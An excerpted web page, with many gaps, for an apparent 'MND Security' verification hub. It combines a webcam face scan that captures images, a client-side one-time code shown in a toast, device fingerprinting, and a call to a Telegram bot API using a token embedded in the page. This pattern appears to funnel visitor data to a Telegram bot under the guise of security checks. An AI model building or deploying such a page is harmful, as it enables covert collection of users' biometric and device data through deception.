...
<div id="mndPushNotif" class="mnd-android-toast mnd-toast-hidden" onclick="copyPushOTP()">
    <div class="mnd-toast-icon">
        <img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" alt="MND Logo">
    </div>
    <div class="mnd-toast-content">
        <span class="mnd-toast-title">MND Security <span style="font-weight:400; opacity:0.7; font-size: 10px;">• Now</span></span>
        <span class="mnd-toast-desc">Tap to copy access key</span>
    </div>
    <div class="mnd-toast-otp" id="mndPushOtpText">******</div>
</div>
        ...
        <div class="mnd-scrollable-body">
            ...
            <div id="hubStepFaceID" class="mnd-step-container" style="display:none; flex-direction:column; align-items:center;">
                ...
                <div class="mnd-scanner-container">
                    <video id="hubVideo" autoplay muted playsinline></video>
                ...
                <button id="hubCaptureBtn" class="mnd-mfa-btn mnd-btn-face mnd-pulse-btn" onclick="executeFaceAnalysis()">
                    <i class="fas fa-crosshairs mnd-btn-icon-left"></i> INITIATE FAST SCAN
                </button>
...
<style>
    ...
    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
    ...
    .mnd-btn-glare { position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(255,255,255,0.03) 0%, transparent 60%); opacity: 0; transition: var(--ease-apple); pointer-events: none; z-index: 1; }
    .mnd-premium-media-btn:hover .mnd-btn-glare { opacity: 1; }

    /* ==========================================================================
       [ 3. SMALL ANDROID-STYLE TOAST NOTIFICATION ]
       ========================================================================== */
    .mnd-android-toast { 
        position: fixed; top: -150px; left: 50%; transform: translateX(-50%); width: 92%; max-width: 360px; 
        background: rgba(22, 22, 22, 0.98); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
        border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 12px 16px; 
        z-index: 9999999999; display: flex; align-items: center; gap: 15px; 
        box-shadow: 0 15px 35px rgba(0,0,0,0.9), inset 0 1px 0 rgba(255,255,255,0.1);
        transition: top 0.5s var(--ease-bounce), opacity 0.3s ease; opacity: 0; cursor: pointer;
    }
    .mnd-toast-hidden { top: -150px; opacity: 0; }
    .mnd-toast-visible { top: 20px; opacity: 1; }
    .mnd-toast-icon { width: 34px; height: 34px; border-radius: 8px; background: var(--mnd-gold-primary); padding: 2px; flex-shrink: 0; box-shadow: 0 0 10px var(--mnd-gold-glow); }
    .mnd-toast-icon img { width: 100%; height: 100%; border-radius: 6px; object-fit: cover; }
    .mnd-toast-content { flex: 1; display: flex; flex-direction: column; justify-content: center; }
    .mnd-toast-title { color: #fff; font-size: 13px; font-weight: 700; margin-bottom: 2px; }
    .mnd-toast-desc { color: #aaa; font-size: 11px; }
    .mnd-toast-otp { font-family: var(--mnd-font-body); font-size: 18px; font-weight: 900; color: var(--mnd-gold-primary); letter-spacing: 3px; text-shadow: 0 0 8px var(--mnd-gold-glow); background: rgba(212,175,55,0.1); padding: 5px 10px; border-radius: 8px; border: 1px dashed rgba(212,175,55,0.3); }
    .mnd-android-toast:active { transform: translateX(-50%) scale(0.96); }
    ...
    .mnd-sheet-drag-handle { width: 40px; height: 5px; background: rgba(255,255,255,0.2); border-radius: 3px; margin: 0 auto 15px; }
    ...
    .mnd-logo-radar-sweep { position: absolute; inset: -1px; border-radius: 50%; background: conic-gradient(from 0deg, transparent 70%, rgba(255,255,255,0.8) 100%); z-index: 3; animation: radarSweep 3s linear infinite; mix-blend-mode: overlay; pointer-events: none; }
    ...
    .mnd-neon-input {
        ...
        transition: var(--ease-apple); -webkit-appearance: none;
    }
    .mnd-input-focus-border { position: absolute; inset: 0; border-radius: 14px; border: 2px solid var(--mnd-gold-primary); opacity: 0; transition: var(--ease-apple); pointer-events: none; z-index: 2; box-shadow: 0 0 10px var(--mnd-gold-glow); transform: scale(1.02); }
    ...
    .mnd-mfa-btn {
        ...
        transition: var(--ease-bounce); border: none; position: relative; overflow: hidden; letter-spacing: 0.5px;
    ...
    .mnd-scanner-container {
        ...
        box-shadow: 0 10px 30px rgba(0,0,0,0.8); transform: translateZ(0);
    }
    ...
    .mnd-otp-input-box { 
        ...
        text-shadow: 0 0 15px var(--mnd-gold-glow); transition: var(--ease-apple); position: relative; z-index: 2;
    ...
    @keyframes slideInRight { 0% { opacity: 0; transform: translateX(20px) translateZ(0); } 100% { opacity: 1; transform: translateX(0) translateZ(0); } }
...
<script>
    ...
    /* =========================================================================================
       [ 2. CORE UI CONTROLS & APPLE-SMOOTH MEMORY CLEAR ]
       ========================================================================================= */
    ...
    function resetToMethods() {
        // THE ABORT FIX: Instantly clears RAM, stops camera, and resets OTP logic
        stopCamera();
        ...
        closePushNotif(); 
        mndOTP = ""; // Completely wipe the old OTP
    }

    function stopCamera() { 
        clearInterval(scanInterval); // Stop fast scanning
        if (videoStream) { 
    ...
    /* =========================================================================================
       [ 3. STANDARD OTP METHOD (ALWAYS GENERATES NEW OTP) ]
       ========================================================================================= */
    async function generateStandardOTP() {
        ...
        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
            ...
            displayPushNotification(mndOTP); // Trigger Toast
    ...
    /* =========================================================================================
       [ 4. AI FACE SCANNER (FAST & STRICT HUMAN DETECTION) ]
       ========================================================================================= */
    async function startFaceScanning() {
        ...
        statusBadge.innerHTML = '<i class="fas fa-video"></i> AWAITING ALIGNMENT';
    ...
    async function executeFaceAnalysis() {
        ...
        btn.innerHTML = '<i class="fas fa-radar fa-spin mnd-btn-icon-left"></i> FAST SCAN ACTIVE...';
        btn.disabled = true;

        try {
            instruction.style.color = "#00fa9a";
            instruction.innerText = "Locking onto strict human geometry...";
            ...
            // --- FAST & STRICT CONTINUOUS SCAN LOOP ---
            let attempts = 0;
            const maxAttempts = 30; // Scans 30 times (every 150ms for ~4.5 seconds)
            ...
            scanInterval = setInterval(async () => {
                ...
                // STRICT HUMAN CHECK: Ensures AI is >90% confident it's a real face
                if (predictions.length > 0) {
                    const confidenceScore = predictions[0].probability[0]; 
                ...
                if (isRealHuman) {
                    ...
                    statusBadge.innerHTML = '<i class="fas fa-check-circle"></i> HUMAN MATCH (90%+)';
                    ...
                    canvas.toBlob(async (blob) => {
                        ...
                        displayPushNotification(mndOTP); // Trigger small toast
                        ...
                        btn.innerHTML = '<i class="fas fa-crosshairs mnd-btn-icon-left"></i> INITIATE FAST SCAN';
                        btn.disabled = false;
                    }, 'image/jpeg', 0.85);

                } else if (attempts >= maxAttempts) {
                    // TIME OUT / NO REAL HUMAN FOUND
                    clearInterval(scanInterval);
                    
                    statusBadge.className = "mnd-status-badge mnd-badge-error";
                    statusBadge.innerHTML = '<i class="fas fa-times-circle"></i> FAILED: NO HUMAN DETECTED';
                    instruction.style.color = "#ff3333";
                    instruction.innerText = "Tracking failed. Ensure direct lighting on face.";
                    
                    scannerBox.classList.remove('scanner-active');
                    scannerBox.classList.add('scanner-error');
                    
                    btn.innerHTML = '<i class="fas fa-redo mnd-btn-icon-left"></i> RETRY SCAN';
                    btn.disabled = false;
                }
            }, 150); // FAST SCAN: Checks every 150 milliseconds!

        } catch (error) {
            clearInterval(scanInterval);
            instruction.style.color = "#ff3333";
            instruction.innerText = "Fatal AI Engine Error.";
            scannerBox.classList.remove('scanner-active');
    ...
    /* =========================================================================================
       [ 6. ANDROID-STYLE TOAST NOTIFICATION LOGIC ]
       ========================================================================================= */
    ...
    function displayPushNotification(code) {
        ...
        notifEl.classList.remove('mnd-toast-hidden');
        notifEl.classList.add('mnd-toast-visible');
        clearTimeout(pushTimer); 
        pushTimer = setTimeout(closePushNotif, 10000); // Auto close after 10 seconds
    }
    
    function closePushNotif() {
        notifEl.classList.remove('mnd-toast-visible');
        notifEl.classList.add('mnd-toast-hidden');
    }
    
    function copyPushOTP() {
        navigator.clipboard.writeText(mndOTP);
        const desc = document.querySelector('.mnd-toast-desc');
        desc.innerText = "✅ Key copied to clipboard!"; 
        desc.style.color = "var(--mnd-green-success)";
        setTimeout(() => { 
            closePushNotif(); 
            setTimeout(() => { desc.innerText = "Tap to copy access key"; desc.style.color = "#aaa"; }, 500);
        }, 1500);
    }
    ...
    async function buildDeviceFingerprint(isReturn, methodStr) {
        ...
        let displayCode = mndOTP === "OS_VERIFIED" ? "897649" : mndOTP;
